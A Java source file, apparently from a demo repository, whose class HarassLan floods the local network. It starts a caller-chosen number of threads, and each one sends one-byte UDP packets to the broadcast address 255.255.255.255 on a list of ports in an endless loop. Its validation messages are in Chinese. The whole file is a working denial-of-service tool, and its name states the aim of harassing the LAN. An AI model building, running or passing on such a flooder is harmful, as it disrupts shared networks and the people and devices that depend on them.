package com.github.kahlkn.demo._function.harass.lan;

import org.apache.commons.lang3.ArrayUtils;

import java.io.IOException;
import java.net.*;

public class HarassLan {

    public static void exec(Integer[] ports, int threadNum) throws UnknownHostException {
        if (ArrayUtils.isEmpty(ports)) {
            System.out.println("端口列表不能为空！");
            return;
        }
        if (threadNum <= 0) {
            System.out.println("线程数必须大于0！");
            return;
        }

        final DatagramPacket[] packets = new DatagramPacket[ports.length];
        InetAddress address = InetAddress.getByName("255.255.255.255");
        for (int i = 0; i < ports.length; i++) {
            packets[i] = new DatagramPacket(new byte[]{0}, 1, address, ports[i]);
        }
        for (int i = 0; i < threadNum; i++) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        sender(packets);
                    }
                    catch (SocketException e) {
                        System.out.print("[" + e.getMessage() + "]");
                    }
                }
            }).start();
        }
    }

    private static void sender(final DatagramPacket[] packets) throws SocketException {
        DatagramSocket sender = new DatagramSocket();
        for (;;) {
            for (DatagramPacket packet : packets) {
                try {
                    sender.send(packet);
                    System.out.print(">");
                } catch (IOException e) {
                    System.out.print("*");
                }
            }
        }
    }

}
